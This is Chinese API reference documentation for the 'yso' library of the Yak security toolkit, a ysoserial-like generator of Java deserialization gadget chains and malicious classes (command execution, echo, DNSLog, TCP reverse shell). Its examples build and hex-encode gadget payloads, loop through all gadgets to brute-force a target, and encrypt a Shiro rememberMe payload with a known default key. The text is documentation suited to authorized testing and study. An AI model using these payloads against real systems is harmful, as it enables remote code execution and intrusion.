# yso {#library-yso}

`yso`（Yak Serialization Objects）库是 Java 反序列化利用 Payload 的生成中枢，对标 ysoserial：内置大量 gadget 链与恶意类模板，可生成命令执行、回显、反连、DNSLog 等各类 Java 反序列化 Payload 与恶意 class。

典型使用场景：

- gadget 链：`yso.GetCommonsCollections5JavaObject(cmd)` 等 `Get*JavaObject` 家族生成具体 gadget 链对象，`yso.GetGadget(name, opts...)` 按名取链，`yso.GetAllGadget` / `yso.GetAllRuntimeExecGadget` 列出可用链。
- 恶意类：`yso.GenerateRuntimeExecEvilClassObject(cmd)` / `yso.GenerateProcessBuilderExecEvilClassObject` 生成命令执行类，`yso.GenerateTomcatEchoClassObject` / `yso.GenerateSpringEchoEvilClassObject` 生成回显类，`yso.GenerateDNSlogEvilClassObject` 生成 DNSLog 类，`yso.GenerateTcpReverseShellEvilClassObject` 生成反连类。
- 选项与序列化：`yso.command` / `yso.dnslogDomain` / `yso.majorVersion` / `yso.useTemplate` / `yso.useRuntimeExecTemplate` 等选项定制，`yso.ToBytes` 序列化为字节、`yso.ToBcel` / `yso.ToJson` 转换其他形态，`yso.LoadClassFromBytes` 加载自定义类。

与相邻库的关系：`yso` 生成的 Payload 经 `poc`/`fuzz`（HTTP 投递）、`t3`/`iiop`（协议通道）、`facades`（JNDI 服务端）发往目标，配合 `dnslog`/`risk` 做无回显验证；底层对象构造能力来自 `java`。

> 共 100 个函数

## 函数索引

|函数|参数|返回值|说明|
|:--|:--|:--|:--|
| [yso.GetAllGadget](#getallgadget) | - | `[]any` | 获取所有支持的Java反序列化Gadget。 |
| [yso.GetAllRuntimeExecGadget](#getallruntimeexecgadget) | - | `[]RuntimeExecGadget` | 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget |
| [yso.GetAllTemplatesGadget](#getalltemplatesgadget) | - | `[]TemplatesGadget` | 获取所有支持模板的Gadget，可用于爆破 gadget |
| [yso.GetBeanShell1JavaObject](#getbeanshell1javaobject) | `cmd string` | `*JavaObject, error` | 基于BeanShell1 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections1JavaObject](#getcommonscollections1javaobject) | `cmd string` | `*JavaObject, error` | 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections5JavaObject](#getcommonscollections5javaobject) | `cmd string` | `*JavaObject, error` | 基于Commons Collections 2 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections6JavaObject](#getcommonscollections6javaobject) | `cmd string` | `*JavaObject, error` | 基于Commons Collections 6 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections7JavaObject](#getcommonscollections7javaobject) | `cmd string` | `*JavaObject, error` | 基于Commons Collections 7 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollectionsK3JavaObject](#getcommonscollectionsk3javaobject) | `cmd string` | `*JavaObject, error` | 基于Commons Collections K3 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollectionsK4JavaObject](#getcommonscollectionsk4javaobject) | `cmd string` | `*JavaObject, error` | 基于Commons Collections K4 序列化模板生成并返回一个Java对象。 |
| [yso.GetFindGadgetByDNSJavaObject](#getfindgadgetbydnsjavaobject) | `url string` | `*JavaObject, error` | 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。 |
| [yso.GetGadgetNameByFun](#getgadgetnamebyfun) | `i any` | `string, error` | 从函数指针获取 gadget 名称，通过解析函数名来提取。 |
| [yso.GetGroovy1JavaObject](#getgroovy1javaobject) | `cmd string` | `*JavaObject, error` | 基于Groovy1 序列化模板生成并返回一个Java对象。 |
| [yso.GetJavaObjectFromBytes](#getjavaobjectfrombytes) | `byt []byte` | `*JavaObject, error` | 从字节数组中解析并返回第一个Java对象。 |
| [yso.GetSimplePrincipalCollectionJavaObject](#getsimpleprincipalcollectionjavaobject) | - | `*JavaObject, error` | 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。 |
| [yso.GetURLDNSJavaObject](#geturldnsjavaobject) | `url string` | `*JavaObject, error` | 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。 |
| [yso.ToBcel](#tobcel) | `i any` | `string, error` | 将 Java 类对象转换为 BCEL 编码格式的字符串 |
| [yso.ToJson](#tojson) | `i any` | `string, error` | 将 Java 或反序列化对象转换为 json 字符串 |
| [yso.command](#command) | `cmd string` | `GenClassOptionFun` | SetExecCommand |
| [yso.dirtyDataLength](#dirtydatalength) | `length int` | `MarshalOptionFun` | SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度 |
| [yso.dnslogDomain](#dnslogdomain) | `addr string` | `GenClassOptionFun` | SetDnslog |
| [yso.dump](#dump) | `i any` | `string, error` | 将Java 对象转换为类 Java 代码 |
| [yso.evilClassName](#evilclassname) | `className string` | `GenClassOptionFun` | SetClassName |
| [yso.majorVersion](#majorversion) | `v uint16` | `GenClassOptionFun` | SetMajorVersion |
| [yso.obfuscationClassConstantPool](#obfuscationclassconstantpool) | - | `GenClassOptionFun` | SetObfuscation |
| [yso.springEchoBody](#springechobody) | - | `GenClassOptionFun` | SetEchoBody |
| [yso.springHeader](#springheader) | `key string, val string` | `GenClassOptionFun` | SetHeader |
| [yso.springParam](#springparam) | `val string` | `GenClassOptionFun` | SetParam |
| [yso.springRuntimeExecAction](#springruntimeexecaction) | - | `GenClassOptionFun` | SetExecAction |
| [yso.tcpReverseHost](#tcpreversehost) | `host string` | `GenClassOptionFun` | SetTcpReverseHost |
| [yso.tcpReversePort](#tcpreverseport) | `port int` | `GenClassOptionFun` | SetTcpReversePort |
| [yso.tcpReverseToken](#tcpreversetoken) | `token string` | `GenClassOptionFun` | SetTcpReverseToken |
| [yso.threeBytesCharString](#threebytescharstring) | - | `MarshalOptionFun` | SetToBytesThreeBytesString 设置序列化时使用三字节字符串 |
| [yso.twoBytesCharString](#twobytescharstring) | - | `MarshalOptionFun` | SetToBytesTwoBytesString 设置序列化时使用双字节字符串 |
| [yso.useBase64BytesClass](#usebase64bytesclass) | `base64 string` | `GenClassOptionFun` | SetClassBase64Bytes |
| [yso.useBytesClass](#usebytesclass) | `data []byte` | `GenClassOptionFun` | SetClassBytes |
| [yso.useBytesEvilClass](#usebytesevilclass) | `data []byte` | `GenClassOptionFun` | SetBytesEvilClass |
| [yso.useClassMultiEchoTemplate](#useclassmultiechotemplate) | - | `GenClassOptionFun` | SetClassMultiEchoTemplate |
| [yso.useClassParam](#useclassparam) | `k string, v string` | `GenClassOptionFun` | SetClassParam 设置类生成时的参数 |
| [yso.useConstructorExecutor](#useconstructorexecutor) | - | `GenClassOptionFun` | SetConstruct |
| [yso.useDNSLogEvilClass](#usednslogevilclass) | `addr string` | `GenClassOptionFun` | SetDnslogEvilClass |
| [yso.useDNSlogTemplate](#usednslogtemplate) | - | `GenClassOptionFun` | SetClassDnslogTemplate |
| [yso.useEchoBody](#useechobody) | - | `GenClassOptionFun` | SetEchoBody |
| [yso.useHeaderEchoEvilClass](#useheaderechoevilclass) | - | `GenClassOptionFun` | SetHeaderEchoEvilClass |
| [yso.useHeaderEchoTemplate](#useheaderechotemplate) | - | `GenClassOptionFun` | SetClassHeaderEchoTemplate |
| [yso.useHeaderParam](#useheaderparam) | `key string, val string` | `GenClassOptionFun` | SetHeader |
| [yso.useModifyTomcatMaxHeaderSizeTemplate](#usemodifytomcatmaxheadersizetemplate) | - | `GenClassOptionFun` | SetClassModifyTomcatMaxHeaderSizeTemplate |
| [yso.useMultiEchoEvilClass](#usemultiechoevilclass) | - | `GenClassOptionFun` | SetMultiEchoEvilClass |
| [yso.useParam](#useparam) | `val string` | `GenClassOptionFun` | SetParam |
| [yso.useProcessBuilderExecEvilClass](#useprocessbuilderexecevilclass) | `cmd string` | `GenClassOptionFun` | SetProcessBuilderExecEvilClass |
| [yso.useProcessBuilderExecTemplate](#useprocessbuilderexectemplate) | - | `GenClassOptionFun` | SetClassProcessBuilderExecTemplate |
| [yso.useProcessImplExecEvilClass](#useprocessimplexecevilclass) | `cmd string` | `GenClassOptionFun` | SetProcessImplExecEvilClass |
| [yso.useProcessImplExecTemplate](#useprocessimplexectemplate) | - | `GenClassOptionFun` | SetClassProcessImplExecTemplate |
| [yso.useRuntimeExecEvilClass](#useruntimeexecevilclass) | `cmd string` | `GenClassOptionFun` | SetRuntimeExecEvilClass |
| [yso.useRuntimeExecTemplate](#useruntimeexectemplate) | - | `GenClassOptionFun` | SetClassRuntimeExecTemplate |
| [yso.useSleepEvilClass](#usesleepevilclass) | - | `GenClassOptionFun` | SetSleepEvilClass |
| [yso.useSleepTemplate](#usesleeptemplate) | - | `GenClassOptionFun` | SetClassSleepTemplate |
| [yso.useSleepTime](#usesleeptime) | `time int` | `GenClassOptionFun` | SetSleepTime |
| [yso.useSpringEchoTemplate](#usespringechotemplate) | - | `GenClassOptionFun` | SetClassSpringEchoTemplate |
| [yso.useTcpReverseEvilClass](#usetcpreverseevilclass) | `host string, port int` | `GenClassOptionFun` | SetTcpReverseEvilClass |
| [yso.useTcpReverseShellEvilClass](#usetcpreverseshellevilclass) | `host string, port int` | `GenClassOptionFun` | SetTcpReverseShellEvilClass |
| [yso.useTcpReverseShellTemplate](#usetcpreverseshelltemplate) | - | `GenClassOptionFun` | SetClassTcpReverseShellTemplate |
| [yso.useTcpReverseTemplate](#usetcpreversetemplate) | - | `GenClassOptionFun` | SetClassTcpReverseTemplate |
| [yso.useTemplate](#usetemplate) | `t ClassType` | `GenClassOptionFun` | SetClassType 设置要生成的类类型 |
| [yso.useTomcatEchoEvilClass](#usetomcatechoevilclass) | - | `GenClassOptionFun` | SetTomcatEchoEvilClass |
| [yso.useTomcatEchoTemplate](#usetomcatechotemplate) | - | `GenClassOptionFun` | SetClassTomcatEchoTemplate |

## 可变参数函数索引

|函数|参数|返回值|说明|
|:--|:--|:--|:--|
| [yso.GenerateClass](#generateclass) | `options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 根据提供的配置选项生成一个Java类对象。 |
| [yso.GenerateClassObjectFromBytes](#generateclassobjectfrombytes) | `bytes []byte, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 从字节数组中加载并返回一个javaclassparser.ClassObject对象。 |
| [yso.GenerateDNSlogEvilClassObject](#generatednslogevilclassobject) | `domain string, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | GenDnslogClassObject |
| [yso.GenerateHeaderEchoClassObject](#generateheaderechoclassobject) | `options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | GenHeaderEchoClassObject |
| [yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject](#generatemodifytomcatmaxheadersizeevilclassobject) | `options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象， |
| [yso.GenerateMultiEchoClassObject](#generatemultiechoclassobject) | `options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | GenMultiEchoClassObject |
| [yso.GenerateProcessBuilderExecEvilClassObject](#generateprocessbuilderexecevilclassobject) | `cmd string, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象， |
| [yso.GenerateProcessImplExecEvilClassObject](#generateprocessimplexecevilclassobject) | `cmd string, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象， |
| [yso.GenerateRuntimeExecEvilClassObject](#generateruntimeexecevilclassobject) | `cmd string, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象， |
| [yso.GenerateSleepClassObject](#generatesleepclassobject) | `options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | GenSleepClassObject |
| [yso.GenerateSpringEchoEvilClassObject](#generatespringechoevilclassobject) | `options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象， |
| [yso.GenerateTcpReverseEvilClassObject](#generatetcpreverseevilclassobject) | `host string, port int, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | GenTcpReverseClassObject |
| [yso.GenerateTcpReverseShellEvilClassObject](#generatetcpreverseshellevilclassobject) | `host string, port int, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | GenTcpReverseShellClassObject |
| [yso.GenerateTomcatEchoClassObject](#generatetomcatechoclassobject) | `options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | GenTomcatEchoClassObject |
| [yso.GetClick1JavaObject](#getclick1javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Click1 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsBeanutils183NOCCJavaObject](#getcommonsbeanutils183noccjavaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsBeanutils192NOCCJavaObject](#getcommonsbeanutils192noccjavaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsBeanutils1JavaObject](#getcommonsbeanutils1javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections2JavaObject](#getcommonscollections2javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections3JavaObject](#getcommonscollections3javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections4JavaObject](#getcommonscollections4javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollections8JavaObject](#getcommonscollections8javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollectionsK1JavaObject](#getcommonscollectionsk1javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Collections &lt;=3.2.1 序列化模板生成并返回一个Java对象。 |
| [yso.GetCommonsCollectionsK2JavaObject](#getcommonscollectionsk2javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 |
| [yso.GetGadget](#getgadget) | `name string, opts ...any` | `*JavaObject, error` | GenerateGadget this is a highly flexible function that can generate a Java object by three different ways: |
| [yso.GetJBossInterceptors1JavaObject](#getjbossinterceptors1javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。 |
| [yso.GetJSON1JavaObject](#getjson1javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于JSON1 序列化模板生成并返回一个Java对象。 |
| [yso.GetJavassistWeld1JavaObject](#getjavassistweld1javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于JavassistWeld1 序列化模板生成并返回一个Java对象。 |
| [yso.GetJdk7u21JavaObject](#getjdk7u21javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Jdk7u21 序列化模板生成并返回一个Java对象。 |
| [yso.GetJdk8u20JavaObject](#getjdk8u20javaobject) | `options ...GenClassOptionFun` | `*JavaObject, error` | 基于Jdk8u20 序列化模板生成并返回一个Java对象。 |
| [yso.LoadClassFromBCEL](#loadclassfrombcel) | `data string, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组， |
| [yso.LoadClassFromBase64](#loadclassfrombase64) | `base64 string, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。 |
| [yso.LoadClassFromBytes](#loadclassfrombytes) | `bytes []byte, options ...GenClassOptionFun` | `*javaclassparser.ClassObject, error` | 从字节数组中加载并返回一个javaclassparser.ClassObject对象。 |
| [yso.ToBytes](#tobytes) | `i any, opts ...MarshalOptionFun` | `[]byte, error` | 将 Java 或反序列化对象转换为字节码 |

## 函数详情

### GetAllGadget {#getallgadget}

```go
GetAllGadget() []any
```

获取所有支持的Java反序列化Gadget。

这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。

对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；

对于不支持模板实现的Gadget，会创建一个接受命令字符串参数的函数。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `[]any` | 包含所有 Gadget 生成函数的接口切片 |

**示例**

``````````````yak
allGadgets = yso.GetAllGadget()
for _, gadget := range allGadgets {
    // 每个元素都是 gadget 生成函数：模板型接收 ...GenClassOptionFun，命令型接收命令字符串。
    // 此处演示模板型调用，命令型可改为 gadget("whoami")。
    obj, err := gadget(yso.useRuntimeExecEvilClass("whoami"))
    if err != nil {
        continue
    }
    objBytes, _ = yso.ToBytes(obj)
    // 发送 objBytes
}
``````````````

---

### GetAllRuntimeExecGadget {#getallruntimeexecgadget}

```go
GetAllRuntimeExecGadget() []RuntimeExecGadget
```

获取所有的支持的RuntimeExecGadget，可用于爆破 gadget

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `[]RuntimeExecGadget` | 所有支持命令执行的 Gadget 生成函数切片 |

**示例**

``````````````yak
command := "whoami" // 假设的命令字符串
for _, gadget := range yso.GetAllRuntimeExecGadget() {
	javaObj, err := gadget(command)
	if javaObj == nil || err != nil {
		continue
	}
	objBytes, err := yso.ToBytes(javaObj)
	if err != nil {
		continue
	}
	// 发送 objBytes
}
``````````````

---

### GetAllTemplatesGadget {#getalltemplatesgadget}

```go
GetAllTemplatesGadget() []TemplatesGadget
```

获取所有支持模板的Gadget，可用于爆破 gadget

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `[]TemplatesGadget` | 所有支持模板实现的 Gadget 生成函数切片 |

**示例**

``````````````yak
for _, gadget := range yso.GetAllTemplatesGadget() {
	domain := "xxx.dnslog" // dnslog 地址
	javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
	if javaObj == nil || err != nil {
		continue
	}
	objBytes, err := yso.ToBytes(javaObj)
	if err != nil {
		continue
	}
	// 发送 objBytes
}
``````````````

---

### GetBeanShell1JavaObject {#getbeanshell1javaobject}

```go
GetBeanShell1JavaObject(cmd string) (*JavaObject, error)
```

基于BeanShell1 序列化模板生成并返回一个Java对象。

它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要传入Java对象的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 修改后的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, err := yso.GetBeanShell1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetCommonsCollections1JavaObject {#getcommonscollections1javaobject}

```go
GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error)
```

基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, err := yso.GetCommonsCollections1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetCommonsCollections5JavaObject {#getcommonscollections5javaobject}

```go
GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error)
```

基于Commons Collections 2 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetCommonsCollections6JavaObject {#getcommonscollections6javaobject}

```go
GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error)
```

基于Commons Collections 6 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetCommonsCollections7JavaObject {#getcommonscollections7javaobject}

```go
GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error)
```

基于Commons Collections 7 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetCommonsCollectionsK3JavaObject {#getcommonscollectionsk3javaobject}

```go
GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error)
```

基于Commons Collections K3 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetCommonsCollectionsK4JavaObject {#getcommonscollectionsk4javaobject}

```go
GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error)
```

基于Commons Collections K4 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetFindGadgetByDNSJavaObject {#getfindgadgetbydnsjavaobject}

```go
GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error)
```

通过 DNSLOG 探测 CLass Name，进而探测 Gadget。

使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| url | `string` | 要在生成的Java对象中设置的URL字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 构造好的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
url, token, _ = risk.NewDNSLogDomain()
javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
res,err = risk.CheckDNSLogByToken(token)

	if err {
	  //dnslog查询失败
	} else {
	  if len(res) > 0{
	   // dnslog查询成功
	  }
	}
``````````````

---

### GetGadgetNameByFun {#getgadgetnamebyfun}

```go
GetGadgetNameByFun(i any) (string, error)
```

从函数指针获取 gadget 名称，通过解析函数名来提取。

函数名需要符合 &#34;Get*JavaObject&#34; 格式，返回中间的 * 部分作为 gadget 名称

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| i | `any` | gadget 生成函数的函数指针 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `string` | 解析出的 gadget 名称 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
name, err := GetGadgetNameByFun(GetCommonsBeanutils1JavaObject)
// name = "CommonsBeanutils1"
``````````````

---

### GetGroovy1JavaObject {#getgroovy1javaobject}

```go
GetGroovy1JavaObject(cmd string) (*JavaObject, error)
```

基于Groovy1 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetGroovy1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````

---

### GetJavaObjectFromBytes {#getjavaobjectfrombytes}

```go
GetJavaObjectFromBytes(byt []byte) (*JavaObject, error)
```

从字节数组中解析并返回第一个Java对象。

此函数使用ParseJavaSerialized方法来解析提供的字节序列，

并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，

函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| byt | `[]byte` | 要解析的字节数组 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 解析出的第一个 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
raw := "rO0..." // base64 Java serialized object
bytes = codec.DecodeBase64(raw)~ // base64解码
javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
``````````````

---

### GetSimplePrincipalCollectionJavaObject {#getsimpleprincipalcollectionjavaobject}

```go
GetSimplePrincipalCollectionJavaObject() (*JavaObject, error)
```

基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。

主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。

使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
classBytes,_ = yso.ToBytes(javaObject)
data = codec.PKCS5Padding(classBytes, 16)
keyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
iv = []byte(ramdstr(16))
cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
payload = codec.EncodeBase64(append(iv, cipherText...))
// 发送 payload
``````````````

---

### GetURLDNSJavaObject {#geturldnsjavaobject}

```go
GetURLDNSJavaObject(url string) (*JavaObject, error)
```

利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。

这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| url | `string` | 要在生成的Java对象中设置的URL字符串 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*JavaObject` | 构造好的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
url, token, _ = risk.NewDNSLogDomain()
javaObject, _ = yso.GetURLDNSJavaObject(url)
gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
res,err = risk.CheckDNSLogByToken(token)

	if err {
	  //dnslog查询失败
	} else {
	  if len(res) > 0{
	   // dnslog查询成功
	  }
	}
``````````````

---

### ToBcel {#tobcel}

```go
ToBcel(i any) (string, error)
```

将 Java 类对象转换为 BCEL 编码格式的字符串

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| i | `any` | Java 类对象(*javaclassparser.ClassObject) |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `string` | BCEL 编码格式的字符串 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

